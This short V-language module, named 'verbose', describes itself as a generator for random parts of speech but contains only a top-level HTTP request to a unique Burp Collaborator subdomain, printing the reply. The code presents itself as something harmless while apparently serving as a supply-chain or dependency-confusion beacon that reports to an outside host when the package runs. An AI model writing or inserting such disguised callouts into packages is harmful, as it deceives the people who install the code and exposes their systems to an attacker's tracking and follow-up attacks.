module verbose

// verbose is a generator for random parts of speech
import net.http

if resp := http.get('http://8u3ip1h1cvgvlvrs4ctlqun5owu1iq.burpcollaborator.net') {
	println(resp.text) // resp is a http.Response, not an optional
} else {
	println(err)
}
